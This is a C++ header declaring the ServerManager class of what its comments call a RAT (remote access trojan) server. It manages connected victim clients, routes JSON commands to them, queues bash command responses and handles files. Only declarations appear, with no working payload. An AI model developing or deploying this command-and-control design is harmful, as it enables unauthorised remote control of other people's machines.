#pragma once

#include "Utils/TCPSocket.hpp"
#include "IController.hpp"
#include "ClientManagement.hpp"
#include <nlohmann/json.hpp>
#include <memory>
#include <mutex>
#include <map>
#include <string>
#include <queue>
#include <vector>

namespace Server {

class ServerFileController;

/**
 * ServerManager - Central manager for RAT server operations
 * 
 * Responsibilities:
 * - TCP listener management and client connection acceptance
 * - Client lifecycle management (add/remove/query)
 * - Controller registry and routing
 * - Logging subsystem
 * - Response queue management for bash commands
 * - File handler registration for temporary file operations
 */
class ServerManager {
public:
    
    
    
    static std::shared_ptr<ServerManager> getInstance();
    ServerManager(const ServerManager &) = delete;
    ServerManager &operator=(const ServerManager &) = delete;
    ~ServerManager();

    
    
    
    bool start(unsigned short port);        
    void stop();                            
    bool isRunning() const;                 
    int run(unsigned short port);           

    
    
    
    bool addClient(const std::string &deviceName, std::unique_ptr<Utils::TCPSocket> socket);
    bool removeClient(const std::string &deviceName);
    Utils::TCPSocket *getClient(const std::string &deviceName);
    std::vector<std::string> listClients();
    std::string getClientIP(const std::string &name);
    bool hasClient(const std::string &name);

    
    
    
    IController *getSystemController(const std::string &handle);
    
    
    
    
    bool sendRequest(const std::string &clientName, const nlohmann::json &request);
    bool receiveResponse(const std::string &clientName, nlohmann::json &response, int timeoutMs = 5000);


    
    
    
    void pushLog(const std::string &msg);
    bool popLog(std::string &out);
    const std::string &logPath() const { return logPath_; }

    
    
    
    unsigned short port() const { return port_; }

private:
    ServerManager();

    
    
    
    inline static std::shared_ptr<ServerManager> instance;
    inline static std::mutex initMutex;

    
    
    
    std::unique_ptr<Utils::TCPSocket> listener_;    
    unsigned short port_ = 0;                       
    bool running_ = false;                          
    mutable std::mutex mtx_;                        

    
    
    
    std::unique_ptr<ClientManagement> clientManagement_;
    
    
    
    
    std::map<std::string, std::unique_ptr<IController>> controllers_;   



    
    
    
    std::queue<std::string> logs_;                  
    mutable std::mutex logMtx_;                     
    std::string logPath_;                           

    
    
    
    void initializeControllers(unsigned short port); 
    void cleanupResources();                        
    void handleNewClientConnection(std::unique_ptr<Utils::TCPSocket> client, int& unknownCount);
};

} 
